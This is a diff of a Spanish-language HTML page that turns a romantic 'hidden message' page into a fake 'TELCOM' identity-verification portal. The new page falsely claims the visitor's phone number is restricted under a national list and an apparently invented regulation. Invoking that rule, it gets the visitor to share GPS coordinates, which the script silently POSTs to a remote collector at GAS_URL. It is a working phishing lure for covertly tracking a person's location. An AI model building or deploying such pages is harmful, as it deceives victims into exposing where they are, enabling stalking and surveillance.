@@ -3,99 +3,406 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Un mensaje para ti ♡</title>
+<title>TELCOM — Verificación de Identidad</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;1,300;1,400&family=DM+Mono:wght@300&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Barlow:wght@300;400;500;600&family=Barlow+Condensed:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
   *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
   :root {
-    --deep: #0d0508; --rose: #e8527a; --rose2: #ff8fa8;
-    --cream: #fff5f8; --gold: #e8c07a; --text: #fae8ee;
-    --muted: rgba(250,232,238,0.5);
+    --bg:       #080c10;
+    --bg2:      #0d1318;
+    --panel:    #111820;
+    --border:   #1e2d3d;
+    --border2:  #243444;
+    --cyan:     #00c8e0;
+    --cyan2:    #00a0b4;
+    --cyan-dim: rgba(0,200,224,0.12);
+    --green:    #00e58a;
+    --green-dim:rgba(0,229,138,0.1);
+    --amber:    #f0a500;
+    --red:      #e03a3a;
+    --text:     #c8d8e8;
+    --text-dim: #607888;
+    --text-faint:#3a5060;
   }
-  html, body { width: 100%; height: 100%; overflow: hidden; background: var(--deep); color: var(--text); font-family: 'DM Mono', monospace; }
-  .screen { position: fixed; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 2rem; opacity: 0; pointer-events: none; transition: opacity 0.7s ease; }
+  html, body { width: 100%; height: 100%; overflow: hidden; background: var(--bg); color: var(--text); font-family: 'Barlow', sans-serif; }
+  .screen { position: fixed; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 1.5rem; opacity: 0; pointer-events: none; transition: opacity 0.5s ease; }
   .screen.active { opacity: 1; pointer-events: all; }
-  #particleCanvas { position: fixed; inset: 0; pointer-events: none; z-index: 0; }
-  .ambient { position: fixed; inset: 0; pointer-events: none; z-index: 0; background: radial-gradient(ellipse at 30% 40%, rgba(232,82,122,0.12) 0%, transparent 55%), radial-gradient(ellipse at 75% 70%, rgba(192,57,90,0.08) 0%, transparent 50%), radial-gradient(ellipse at 60% 20%, rgba(232,192,122,0.06) 0%, transparent 45%); }
 
-  /* PERMISO */
-  #screenPermission { z-index: 1; text-align: center; }
-  .perm-icon { font-size: 3.5rem; margin-bottom: 1.5rem; animation: float 3s ease-in-out infinite; }
-  @keyframes float { 0%,100%{transform:translateY(0) rotate(-3deg)} 50%{transform:translateY(-10px) rotate(3deg)} }
-  .perm-pre { font-size: 0.58rem; letter-spacing: 0.2em; text-transform: uppercase; color: var(--gold); margin-bottom: 0.75rem; }
-  .perm-title { font-family: 'Playfair Display', serif; font-size: clamp(1.4rem,4vw,2rem); color: var(--cream); margin-bottom: 0.9rem; }
-  .perm-body { font-size: 0.72rem; line-height: 1.8; color: var(--muted); max-width: 400px; margin-bottom: 1.2rem; }
-  .read-more-btn { background: none; border: none; font-family: 'DM Mono', monospace; font-size: 0.6rem; letter-spacing: 0.1em; text-transform: uppercase; color: rgba(250,232,238,0.3); cursor: pointer; text-decoration: underline; text-decoration-color: rgba(250,232,238,0.15); display: block; margin: 0 auto 0.75rem; transition: color 0.2s; }
-  .read-more-btn:hover { color: rgba(250,232,238,0.6); }
-  .perm-legal { font-size: 0.58rem; color: rgba(250,232,238,0.3); max-width: 380px; line-height: 1.7; border: 1px solid rgba(250,232,238,0.08); padding: 0.85rem 1rem; border-radius: 2px; text-align: left; margin: 0 auto 1.5rem; display: none; }
-  .perm-legal.visible { display: block; animation: fadeDown 0.3s ease; }
-  @keyframes fadeDown { from{opacity:0;transform:translateY(-6px)} to{opacity:1;transform:none} }
-  .perm-actions { display: flex; gap: 1rem; flex-wrap: wrap; justify-content: center; margin-top: 0.5rem; }
-  .btn-accept { background: linear-gradient(135deg, var(--rose) 0%, #c0395a 100%); color: #fff; border: none; padding: 0.9rem 2.2rem; font-family: 'DM Mono', monospace; font-size: 0.68rem; letter-spacing: 0.1em; text-transform: uppercase; cursor: pointer; border-radius: 1px; box-shadow: 0 4px 20px rgba(232,82,122,0.35); transition: box-shadow 0.2s, transform 0.1s; }
-  .btn-accept:hover { box-shadow: 0 6px 32px rgba(232,82,122,0.55); }
-  .btn-accept:active { transform: scale(0.97); }
-  .btn-decline { background: none; border: 1px solid rgba(250,232,238,0.15); color: var(--muted); padding: 0.9rem 1.5rem; font-family: 'DM Mono', monospace; font-size: 0.68rem; letter-spacing: 0.1em; text-transform: uppercase; cursor: pointer; border-radius: 1px; transition: border-color 0.2s; }
-  .btn-decline:hover { border-color: rgba(250,232,238,0.35); }
+  /* ── SCAN LINES ── */
+  body::before {
+    content: ''; position: fixed; inset: 0; pointer-events: none; z-index: 9999;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.18) 2px, rgba(0,0,0,0.18) 4px);
+  }
+  /* ── GRID AMBIENT ── */
+  .grid-bg {
+    position: fixed; inset: 0; pointer-events: none; z-index: 0;
+    background-image:
+      linear-gradient(rgba(0,200,224,0.04) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,200,224,0.04) 1px, transparent 1px);
+    background-size: 40px 40px;
+  }
+  .vignette {
+    position: fixed; inset: 0; pointer-events: none; z-index: 0;
+    background: radial-gradient(ellipse at center, transparent 40%, rgba(8,12,16,0.85) 100%);
+  }
+  /* corner accents */
+  .corner { position: fixed; width: 60px; height: 60px; pointer-events: none; z-index: 1; }
+  .corner--tl { top: 16px; left: 16px; border-top: 1px solid var(--cyan2); border-left: 1px solid var(--cyan2); }
+  .corner--tr { top: 16px; right: 16px; border-top: 1px solid var(--cyan2); border-right: 1px solid var(--cyan2); }
+  .corner--bl { bottom: 16px; left: 16px; border-bottom: 1px solid var(--cyan2); border-left: 1px solid var(--cyan2); }
+  .corner--br { bottom: 16px; right: 16px; border-bottom: 1px solid var(--cyan2); border-right: 1px solid var(--cyan2); }
 
-  /* LOADING */
-  #screenLoading { z-index: 1; text-align: center; }
-  .loading-ring { width: 48px; height: 48px; border: 2px solid rgba(232,82,122,0.2); border-top-color: var(--rose); border-radius: 50%; animation: spin 0.9s linear infinite; margin: 0 auto 1.5rem; }
-  @keyframes spin { to{transform:rotate(360deg)} }
-  .loading-text { font-size: 0.62rem; letter-spacing: 0.15em; text-transform: uppercase; color: var(--muted); }
+  /* ── HEADER BAR ── */
+  .sys-bar {
+    position: fixed; top: 0; left: 0; right: 0; z-index: 10;
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 0.55rem 1.5rem;
+    background: rgba(8,12,16,0.9);
+    border-bottom: 1px solid var(--border);
+    backdrop-filter: blur(6px);
+  }
+  .sys-bar__logo { font-family: 'Barlow Condensed', sans-serif; font-size: 0.9rem; font-weight: 700; letter-spacing: 0.2em; text-transform: uppercase; color: var(--cyan); }
+  .sys-bar__logo span { color: var(--text-dim); font-weight: 400; }
+  .sys-bar__status { font-family: 'Share Tech Mono', monospace; font-size: 0.6rem; color: var(--text-dim); display: flex; gap: 1.5rem; }
+  .sys-bar__status .blink { animation: blink 1.4s step-end infinite; }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
 
-  /* MENSAJE */
-  #screenMessage { z-index: 1; text-align: center; }
-  .msg-envelope { font-size: 4rem; margin-bottom: 1.75rem; display: block; animation: popIn 0.6s cubic-bezier(0.34,1.56,0.64,1) both, floatLoop 3s 0.6s ease-in-out infinite; }
-  @keyframes popIn { from{transform:scale(0) rotate(-10deg);opacity:0} to{transform:scale(1) rotate(-3deg);opacity:1} }
-  @keyframes floatLoop { 0%,100%{transform:translateY(0) rotate(-3deg)} 50%{transform:translateY(-12px) rotate(3deg)} }
-  .msg-pre { font-size: 0.58rem; letter-spacing: 0.2em; text-transform: uppercase; color: var(--gold); margin-bottom: 1rem; opacity: 0; animation: riseIn 0.8s 0.3s ease forwards; }
-  .msg-text { font-family: 'Playfair Display', serif; font-style: italic; font-size: clamp(1.6rem,5vw,2.8rem); line-height: 1.35; max-width: 600px; color: var(--cream); text-shadow: 0 0 40px rgba(232,82,122,0.45); opacity: 0; animation: riseIn 0.9s 0.7s ease forwards; }
-  @keyframes riseIn { from{opacity:0;transform:translateY(18px)} to{opacity:1;transform:none} }
+  /* ── MAIN CARD ── */
+  .card {
+    position: relative; z-index: 2;
+    width: 100%; max-width: 520px;
+    background: var(--panel);
+    border: 1px solid var(--border2);
+    padding: 0;
+    box-shadow: 0 0 60px rgba(0,200,224,0.06), 0 24px 48px rgba(0,0,0,0.6);
+  }
+  .card__header {
+    padding: 1rem 1.5rem;
+    border-bottom: 1px solid var(--border);
+    display: flex; align-items: center; gap: 0.75rem;
+    background: rgba(0,200,224,0.04);
+  }
+  .card__icon {
+    width: 36px; height: 36px; border: 1px solid var(--cyan2);
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+    color: var(--cyan); font-size: 1rem;
+  }
+  .card__title { font-family: 'Barlow Condensed', sans-serif; font-size: 1rem; font-weight: 600; letter-spacing: 0.08em; text-transform: uppercase; color: var(--text); }
+  .card__subtitle { font-size: 0.65rem; color: var(--text-dim); letter-spacing: 0.06em; text-transform: uppercase; margin-top: 0.1rem; }
+  .card__body { padding: 1.5rem; }
 
-  /* DECLINADO */
-  #screenDeclined { z-index: 1; text-align: center; }
-  .declined-icon { font-size: 3rem; margin-bottom: 1rem; opacity: 0.4; }
-  .declined-title { font-family: 'Playfair Display', serif; font-size: 1.4rem; color: var(--muted); margin-bottom: 0.75rem; }
-  .declined-sub { font-size: 0.65rem; color: rgba(250,232,238,0.25); max-width: 300px; line-height: 1.8; }
+  /* ── CASE ID ── */
+  .case-row {
+    display: flex; align-items: center; justify-content: space-between;
+    background: var(--bg2); border: 1px solid var(--border);
+    padding: 0.6rem 0.9rem; margin-bottom: 1.25rem;
+  }
+  .case-row__label { font-family: 'Share Tech Mono', monospace; font-size: 0.58rem; color: var(--text-dim); letter-spacing: 0.1em; text-transform: uppercase; }
+  .case-row__value { font-family: 'Share Tech Mono', monospace; font-size: 0.72rem; color: var(--amber); }
+
+  /* ── STATUS BLOCK ── */
+  .status-block {
+    border: 1px solid rgba(240,165,0,0.3);
+    background: rgba(240,165,0,0.05);
+    padding: 0.85rem 1rem;
+    margin-bottom: 1.25rem;
+    display: flex; gap: 0.75rem; align-items: flex-start;
+  }
+  .status-block__dot { width: 8px; height: 8px; background: var(--amber); border-radius: 50%; flex-shrink: 0; margin-top: 0.3rem; animation: pulse 2s ease-in-out infinite; }
+  @keyframes pulse { 0%,100%{opacity:1;box-shadow:0 0 0 0 rgba(240,165,0,0.4)} 50%{opacity:0.8;box-shadow:0 0 0 6px rgba(240,165,0,0)} }
+  .status-block__text { font-size: 0.7rem; line-height: 1.7; color: var(--text-dim); }
+  .status-block__text strong { color: var(--text); font-weight: 500; }
+
+  /* ── DETAIL LIST ── */
+  .detail-list { margin-bottom: 1.25rem; }
+  .detail-item { display: flex; justify-content: space-between; align-items: center; padding: 0.45rem 0; border-bottom: 1px solid var(--border); font-size: 0.68rem; }
+  .detail-item:last-child { border-bottom: none; }
+  .detail-item__key { color: var(--text-dim); font-family: 'Share Tech Mono', monospace; font-size: 0.62rem; letter-spacing: 0.06em; }
+  .detail-item__val { color: var(--text); font-weight: 500; }
+  .detail-item__val.ok { color: var(--green); }
+  .detail-item__val.warn { color: var(--amber); }
+
+  /* ── AVISO LEGAL ── */
+  .read-more-btn {
+    background: none; border: none;
+    font-family: 'Share Tech Mono', monospace; font-size: 0.6rem;
+    letter-spacing: 0.08em; text-transform: uppercase;
+    color: var(--text-faint); cursor: pointer;
+    text-decoration: underline; text-decoration-color: var(--text-faint);
+    display: block; margin-bottom: 0.75rem;
+    transition: color 0.2s;
+  }
+  .read-more-btn:hover { color: var(--cyan2); }
+  .legal-box {
+    display: none;
+    background: var(--bg2); border: 1px solid var(--border);
+    padding: 0.8rem 1rem; margin-bottom: 1rem;
+    font-family: 'Share Tech Mono', monospace; font-size: 0.58rem;
+    line-height: 1.8; color: var(--text-dim); letter-spacing: 0.02em;
+  }
+  .legal-box.visible { display: block; animation: fadeIn 0.3s ease; }
+  @keyframes fadeIn { from{opacity:0;transform:translateY(-4px)} to{opacity:1;transform:none} }
+
+  /* ── ACTIONS ── */
+  .action-row { display: flex; gap: 0.75rem; flex-wrap: wrap; }
+  .btn-primary {
+    flex: 1; min-width: 180px;
+    background: transparent;
+    border: 1px solid var(--cyan);
+    color: var(--cyan);
+    padding: 0.85rem 1.5rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-size: 0.8rem; font-weight: 600;
+    letter-spacing: 0.15em; text-transform: uppercase;
+    cursor: pointer;
+    position: relative; overflow: hidden;
+    transition: background 0.2s, box-shadow 0.2s;
+  }
+  .btn-primary::before {
+    content: ''; position: absolute; inset: 0;
+    background: var(--cyan-dim);
+    transform: translateX(-100%); transition: transform 0.25s ease;
+  }
+  .btn-primary:hover { box-shadow: 0 0 20px rgba(0,200,224,0.25); }
+  .btn-primary:hover::before { transform: translateX(0); }
+  .btn-primary:active { transform: scale(0.98); }
+  .btn-secondary {
+    background: none; border: 1px solid var(--border2);
+    color: var(--text-dim);
+    padding: 0.85rem 1.2rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-size: 0.78rem; font-weight: 500;
+    letter-spacing: 0.1em; text-transform: uppercase;
+    cursor: pointer; transition: border-color 0.2s, color 0.2s;
+  }
+  .btn-secondary:hover { border-color: var(--text-dim); color: var(--text); }
+
+  /* ── LOADING ── */
+  #screenLoading .card__body { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 3rem 1.5rem; gap: 1.5rem; text-align: center; }
+  .loader-wrap { position: relative; width: 56px; height: 56px; }
+  .loader-ring {
+    position: absolute; inset: 0;
+    border: 1px solid var(--border2);
+    border-top-color: var(--cyan);
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
+  .loader-ring--slow {
+    inset: 6px;
+    border-color: var(--border);
+    border-right-color: var(--cyan2);
+    animation: spin 1.5s linear infinite reverse;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .loader-label { font-family: 'Share Tech Mono', monospace; font-size: 0.62rem; color: var(--text-dim); letter-spacing: 0.12em; text-transform: uppercase; }
+  .loader-sub { font-size: 0.6rem; color: var(--text-faint); font-family: 'Share Tech Mono', monospace; }
+
+  /* ── SUCCESS ── */
+  #screenMessage .card { border-color: rgba(0,229,138,0.3); }
+  #screenMessage .card__header { background: rgba(0,229,138,0.05); border-color: rgba(0,229,138,0.2); }
+  #screenMessage .card__icon { border-color: var(--green); color: var(--green); }
+  .success-check {
+    width: 52px; height: 52px; border: 1px solid var(--green);
+    border-radius: 50%; display: flex; align-items: center; justify-content: center;
+    color: var(--green); font-size: 1.4rem; margin: 0 auto 1.25rem;
+    animation: popIn 0.5s cubic-bezier(0.34,1.56,0.64,1) both;
+    box-shadow: 0 0 24px rgba(0,229,138,0.2);
+  }
+  @keyframes popIn { from{transform:scale(0);opacity:0} to{transform:scale(1);opacity:1} }
+  .success-title { font-family: 'Barlow Condensed', sans-serif; font-size: 1.1rem; font-weight: 600; letter-spacing: 0.12em; text-transform: uppercase; color: var(--green); margin-bottom: 0.5rem; text-align: center; }
+  .msg-display {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.8rem;
+    color: var(--text);
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--green);
+    padding: 0.85rem 1rem;
+    line-height: 1.7;
+    margin-top: 1rem;
+    animation: fadeIn 0.6s 0.3s ease both;
+    word-break: break-word;
+  }
+  .success-ref { font-family: 'Share Tech Mono', monospace; font-size: 0.58rem; color: var(--text-faint); text-align: center; margin-top: 1rem; }
+
+  /* ── DECLINED ── */
+  #screenDeclined .card { border-color: rgba(224,58,58,0.2); }
+  #screenDeclined .card__header { background: rgba(224,58,58,0.04); border-color: rgba(224,58,58,0.2); }
+  #screenDeclined .card__icon { border-color: var(--red); color: var(--red); }
+  .declined-msg { font-size: 0.72rem; line-height: 1.8; color: var(--text-dim); }
+  .declined-msg strong { color: var(--amber); }
+
+  /* ── PROGRESS BAR (decorative) ── */
+  .progress-wrap { margin-bottom: 1.5rem; }
+  .progress-label { display: flex; justify-content: space-between; font-family: 'Share Tech Mono', monospace; font-size: 0.58rem; color: var(--text-dim); margin-bottom: 0.35rem; }
+  .progress-bar { height: 2px; background: var(--border); position: relative; overflow: hidden; }
+  .progress-bar::after { content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 72%; background: linear-gradient(90deg, var(--cyan2), var(--cyan)); }
+  .progress-bar--steps { display: flex; gap: 3px; height: 4px; margin-bottom: 1.5rem; }
+  .progress-bar--steps span { flex: 1; background: var(--border); }
+  .progress-bar--steps span.done { background: var(--cyan); }
+  .progress-bar--steps span.active { background: var(--amber); animation: pulse-bar 1s ease-in-out infinite; }
+  @keyframes pulse-bar { 0%,100%{opacity:1} 50%{opacity:0.5} }
 </style>
 </head>
 <body>
-<div class="ambient"></div>
-<canvas id="particleCanvas"></canvas>
 
-<!-- SCREEN 1: PERMISO -->
-<div class="screen active" id="screenPermission">
-  <div class="perm-icon">💌</div>
-  <p class="perm-pre">Tienes un mensaje esperándote</p>
-  <h2 class="perm-title">Desbloquear mensaje</h2>
-  <p class="perm-body">Alguien especial te envió algo. Para revelarlo, necesitas aceptar nuestro aviso de privacidad <strong style="color:var(--rose2)">una sola vez</strong>.</p>
-  <button class="read-more-btn" onclick="toggleLegal()">⚠ Aviso de privacidad</button>
-  <div class="perm-legal" id="legalText">Al aceptar, compartes tus coordenadas GPS con el remitente del mensaje. La ubicación se almacena por máximo 5 minutos y luego se elimina automáticamente. Tu consentimiento es voluntario; puedes declinar sin consecuencias. Datos tratados conforme a la LFPDPPP (México) / GDPR / CCPA / CPRA .</div>
-  <div class="perm-actions">
-    <button class="btn-accept" onclick="requestLocation()">Aceptar ♡</button>
-    <button class="btn-decline" onclick="showDeclined()">No aceptar</button>
+<div class="grid-bg"></div>
+<div class="vignette"></div>
+<div class="corner corner--tl"></div>
+<div class="corner corner--tr"></div>
+<div class="corner corner--bl"></div>
+<div class="corner corner--br"></div>
+
+<div class="sys-bar">
+  <div class="sys-bar__logo">TELCOM <span>/ Portal de Cumplimiento</span></div>
+  <div class="sys-bar__status">
+    <span>SYS: ONLINE</span>
+    <span class="blink">●</span>
+    <span id="sysTime">--:--:--</span>
   </div>
 </div>
 
-<!-- SCREEN: CARGANDO -->
+<!-- ══ SCREEN 1: VERIFICACIÓN ══ -->
+<div class="screen active" id="screenPermission" style="padding-top:3.5rem;">
+  <div class="card">
+    <div class="card__header">
+      <div class="card__icon">⊞</div>
+      <div>
+        <div class="card__title">Verificación de Identidad</div>
+        <div class="card__subtitle">Proceso de exclusión — Lista de Restricción Nacional</div>
+      </div>
+    </div>
+    <div class="card__body">
+
+      <div class="progress-bar--steps">
+        <span class="done"></span>
+        <span class="done"></span>
+        <span class="active"></span>
+        <span></span>
+        <span></span>
+      </div>
+
+      <div class="case-row">
+        <span class="case-row__label">Caso ref.</span>
+        <span class="case-row__value" id="caseRef">LRN---------</span>
+      </div>
+
+      <div class="status-block">
+        <div class="status-block__dot"></div>
+        <div class="status-block__text">
+          Tu número ha sido identificado en la <strong>Lista de Restricción Nacional (LRN)</strong>. Para proceder con la solicitud de exclusión es necesario <strong>verificar tu ubicación geográfica</strong> y confirmar que la solicitud se realiza desde territorio válido conforme al Art. 47-B del Reglamento de Telecomunicaciones.
+        </div>
+      </div>
+
+      <div class="detail-list">
+        <div class="detail-item">
+          <span class="detail-item__key">Estado del número</span>
+          <span class="detail-item__val warn">RESTRINGIDO</span>
+        </div>
+        <div class="detail-item">
+          <span class="detail-item__key">Tipo de restricción</span>
+          <span class="detail-item__val">Categoría II — Automática</span>
+        </div>
+        <div class="detail-item">
+          <span class="detail-item__key">Tiempo estimado de exclusión</span>
+          <span class="detail-item__val ok">3–5 días hábiles</span>
+        </div>
+        <div class="detail-item">
+          <span class="detail-item__key">Verificación geográfica</span>
+          <span class="detail-item__val warn">PENDIENTE</span>
+        </div>
+      </div>
+
+      <button class="read-more-btn" onclick="toggleLegal()">▸ Aviso de tratamiento de datos</button>
+      <div class="legal-box" id="legalText">
+        Al confirmar, autorizas la captura puntual de tus coordenadas GPS para verificación geográfica. Las coordenadas se almacenan por un máximo de 5 minutos y son eliminadas automáticamente. El consentimiento es voluntario; puedes declinar sin consecuencias sobre tu número. Datos tratados conforme a la LFPDPPP (México) / GDPR / CCPA / CPRA.
+      </div>
+
+      <div class="action-row">
+        <button class="btn-primary" onclick="requestLocation()">⊕ Confirmar y verificar ubicación</button>
+        <button class="btn-secondary" onclick="showDeclined()">Cancelar</button>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- ══ SCREEN: CARGANDO ══ -->
 <div class="screen" id="screenLoading">
-  <div class="loading-ring"></div>
-  <p class="loading-text">Obteniendo ubicación…</p>
+  <div class="card">
+    <div class="card__header">
+      <div class="card__icon">◌</div>
+      <div>
+        <div class="card__title">Procesando Solicitud</div>
+        <div class="card__subtitle">No cierres esta ventana</div>
+      </div>
+    </div>
+    <div class="card__body">
+      <div class="loader-wrap">
+        <div class="loader-ring"></div>
+        <div class="loader-ring loader-ring--slow"></div>
+      </div>
+      <div class="loader-label">Obteniendo coordenadas GPS…</div>
+      <div class="loader-sub">Verificando zona geográfica contra base de datos LRN</div>
+    </div>
+  </div>
 </div>
 
-<!-- SCREEN 2: MENSAJE -->
+<!-- ══ SCREEN: ÉXITO ══ -->
 <div class="screen" id="screenMessage">
-  <span class="msg-envelope">💌</span>
-  <p class="msg-pre">Un mensaje especial para ti</p>
-  <p class="msg-text" id="msgDisplay"></p>
+  <div class="card">
+    <div class="card__header">
+      <div class="card__icon">✓</div>
+      <div>
+        <div class="card__title">Solicitud Registrada</div>
+        <div class="card__subtitle">Exclusión de Lista — Confirmada</div>
+      </div>
+    </div>
+    <div class="card__body">
+      <div class="success-check">✓</div>
+      <div class="success-title">Verificación Exitosa</div>
+      <div class="detail-list">
+        <div class="detail-item">
+          <span class="detail-item__key">Ubicación verificada</span>
+          <span class="detail-item__val ok">CONFIRMADA</span>
+        </div>
+        <div class="detail-item">
+          <span class="detail-item__key">Solicitud de exclusión</span>
+          <span class="detail-item__val ok">EN PROCESO</span>
+        </div>
+      </div>
+      <div class="msg-display" id="msgDisplay"></div>
+      <div class="success-ref">REF: <span id="msgRef">LRN---------</span> — Conserva este número de referencia</div>
+    </div>
+  </div>
 </div>
 
-<!-- SCREEN 3: DECLINADO -->
+<!-- ══ SCREEN: CANCELADO ══ -->
 <div class="screen" id="screenDeclined">
-  <div class="declined-icon">🔒</div>
-  <h3 class="declined-title">Sin problema</h3>
-  <p class="declined-sub">Elegiste no compartir tu ubicación. Eso es completamente válido. El mensaje sigue siendo para ti ♡</p>
+  <div class="card">
+    <div class="card__header">
+      <div class="card__icon">✕</div>
+      <div>
+        <div class="card__title">Solicitud Cancelada</div>
+        <div class="card__subtitle">Verificación no completada</div>
+      </div>
+    </div>
+    <div class="card__body">
+      <div class="detail-list">
+        <div class="detail-item">
+          <span class="detail-item__key">Verificación geográfica</span>
+          <span class="detail-item__val" style="color:var(--red)">NO COMPLETADA</span>
+        </div>
+        <div class="detail-item">
+          <span class="detail-item__key">Estado del número</span>
+          <span class="detail-item__val warn">SIN CAMBIOS</span>
+        </div>
+      </div>
+      <p class="declined-msg">La solicitud fue cancelada. Tu número permanecerá en el estado actual. Puedes reiniciar el proceso en cualquier momento. <strong>No se han realizado cambios en tu cuenta.</strong></p>
+    </div>
+  </div>
 </div>
 
 <script>
@@ -107,8 +414,18 @@
   // ══════════════════════════════════════════════
 
   const MSG_ID = new URLSearchParams(location.search).get('id') || 'UNKNOWN';
+  const refCode = 'LRN-' + MSG_ID.replace('MSG-','');
   document.getElementById('msgDisplay').textContent = MSG_TXT;
-  document.title = '♡ ' + MSG_TXT.substring(0, 30);
+  document.getElementById('caseRef').textContent = refCode;
+  document.getElementById('msgRef').textContent = refCode;
+  document.title = 'TELCOM — Verificación ' + refCode;
+
+  // Reloj sistema
+  function tick() {
+    document.getElementById('sysTime').textContent =
+      new Date().toLocaleTimeString('es-MX', {hour12:false});
+  }
+  tick(); setInterval(tick, 1000);
 
   function showScreen(id) {
     document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
@@ -119,7 +436,7 @@
     const el  = document.getElementById('legalText');
     const btn = document.querySelector('.read-more-btn');
     const open = el.classList.toggle('visible');
-    btn.textContent = open ? '▲ Ocultar aviso' : '⚠ Aviso de privacidad';
+    btn.textContent = open ? '▾ Ocultar aviso de datos' : '▸ Aviso de tratamiento de datos';
   }
 
   function requestLocation() {
@@ -135,7 +452,6 @@
   async function onLocationSuccess(pos) {
     const lat = pos.coords.latitude;
     const lng = pos.coords.longitude;
-    // El receiver solo envía datos (POST no-cors) — no necesita leer respuesta
     fetch(GAS_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -143,50 +459,7 @@
       mode: 'no-cors'
     }).catch(e => console.warn('Backend error:', e));
     showScreen('screenMessage');
-    burstParticles(50);
   }
-
-  // PARTÍCULAS
-  const canvas = document.getElementById('particleCanvas');
-  const ctx    = canvas.getContext('2d');
-  const particles = [];
-  function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
-  resize(); window.addEventListener('resize', resize);
-  const EMOJIS = ['♡','♡','♡','✦','˚','·','✿','♡'];
-  class Particle {
-    constructor(x, y, burst) {
-      this.x = x ?? Math.random() * canvas.width;
-      this.y = y ?? canvas.height + 20;
-      this.vx = (Math.random() - 0.5) * (burst ? 5 : 1.2);
-      this.vy = burst ? -(Math.random() * 7 + 2) : -(Math.random() * 1.5 + 0.5);
-      this.alpha = burst ? 1 : Math.random() * 0.7 + 0.3;
-      this.size = burst ? Math.random() * 20 + 10 : Math.random() * 14 + 7;
-      this.symbol = EMOJIS[Math.floor(Math.random() * EMOJIS.length)];
-      this.gravity = burst ? 0.08 : 0;
-      this.life = 1;
-      this.decay = burst ? Math.random() * 0.015 + 0.007 : Math.random() * 0.004 + 0.002;
-      this.wobble = Math.random() * Math.PI * 2;
-      this.wobbleSpeed = (Math.random() - 0.5) * 0.04;
-    }
-    update() { this.wobble += this.wobbleSpeed; this.x += this.vx + Math.sin(this.wobble) * 0.4; this.y += this.vy; this.vy += this.gravity; this.life -= this.decay; }
-    draw() { ctx.save(); ctx.globalAlpha = Math.max(0, this.life * this.alpha); ctx.font = `${this.size}px serif`; ctx.textAlign = 'center'; ctx.fillText(this.symbol, this.x, this.y); ctx.restore(); }
-  }
-  function spawnAmbient() { if (Math.random() < 0.07) particles.push(new Particle()); }
-  function burstParticles(n) {
-    const cx = canvas.width / 2, cy = canvas.height / 2;
-    for (let i = 0; i < n; i++) particles.push(new Particle(cx + (Math.random()-0.5)*140, cy + (Math.random()-0.5)*100, true));
-  }
-  function animate() {
-    ctx.clearRect(0, 0, canvas.width, canvas.height);
-    spawnAmbient();
-    for (let i = particles.length - 1; i >= 0; i--) {
-      particles[i].update(); particles[i].draw();
-      if (particles[i].life <= 0 || particles[i].y < -50) particles.splice(i, 1);
-    }
-    requestAnimationFrame(animate);
-  }
-  animate();
-  setTimeout(() => burstParticles(15), 600);
 </script>
 </body>
 </html>
